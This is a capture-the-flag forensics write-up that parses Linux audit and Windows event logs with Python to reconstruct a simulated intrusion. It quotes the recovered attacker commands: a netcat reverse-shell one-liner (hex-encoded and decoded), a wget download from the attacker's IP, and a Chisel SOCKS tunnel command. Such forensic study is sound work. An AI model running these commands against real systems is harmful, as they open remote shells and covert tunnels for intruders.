# SOCrate

## Description

In June 2023, an operator of vital importance falls victim to an attack that compromises its entire information system. You received the Linux and Windows logs and must answer the investigators’ questions.

This challenge is part of a serie. The parts are numbered in the chronological order of the attack, but it is not necessary to solve them in order.

## Solution

## 1 Technologie

Global search `/var/www` you can find it as `/var/www/app/banque_paouf`. So `FCSC{/var/www/app/banque_paouf}`.

### 2 Reverse Shell

Use following script to collect all executed command lines under Linux:

```python
import pathlib

target_path = "./socrate/linux"
target_path = pathlib.Path(target_path).resolve()
all_cmds = set()
for file in target_path.glob("**/*.log"):
    with open(file, "r", encoding="utf-8") as f:
        for line in iter(f.readline, ""):
            if "EXECVE" in line:
                line = ''.join(line.split("argc=")[1:])
                line = line.split(" ")
                if line[0] == "":
                    continue
                argc = int(line[0])
                line = line[1:]
                cmd = ""

                try:
                    for l in line:
                        if l.startswith("a"):
                            cmd += ''.join(''.join(l.split("=")[1:]).removesuffix("\n").removeprefix('"').removesuffix('"').removesuffix("\n")) + " "
                        else:
                            cmd += l
                    all_cmds.add(cmd.strip())
                except:
                    all_cmds.add(str(line))

with open("all_cmds.txt", "w", encoding="utf-8") as f:
    for cmd in all_cmds:
        f.write(cmd + "\n")
```

Then search for `sh` or `bash`. I found a suspicious line: `/bin/bash -c 726D202F746D702F663B6D6B6669666F202F746D702F663B636174202F746D702F667C2F62696E2F7368202D6920323E26317C6E632038302E3132352E392E3538203530303131203E2F746D702F66` which lead to the flag: `FCSC{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 80.125.9.58 50011 >/tmp/f}`.

### 3 Outil téléchargé

By searching the IP `80.125.9.58` from last flag in the all command lines file, I found `wget http://80.125.9.58:80/text` and `sudo ./text client -v 80.125.9.58:4444 R:socks`.  
Then I google `program with "R:scoks"` and I found [Chisel](https://github.com/jpillora/chisel). So flag is `FCSC{http://80.125.9.58:80/text|chisel}`.

### 4 Latéralisation

use following script to extract all commands executed in Windows:

```python
import glob
from evtx import PyEvtxParser
import os

evts_fs = glob.glob("socrate/windows/*.evtx")
# os.mkdir("socrate/evtx_json")

for f in evts_fs:
    parser = PyEvtxParser(f)
    for record in parser.records_json():
        with open(f"socrate/evtx_json/{f.split('/')[-1]}.json", "w") as outfile:
            outfile.write(record["data"])

```

by converting all `.evtx` file to JSON format. Then global search `ldap` we can find the domain `DC01-SRV.cipherpol.gouv`. Then keep searching `DC01-SRV.cipherpol.gouv` we can find the ip `172.16.42.10`. Then the flag is `FCSC{172.16.42.10|DC01-SRV.cipherpol.gouv}`.

## 5 and 6

I didn't make it in contest :/  
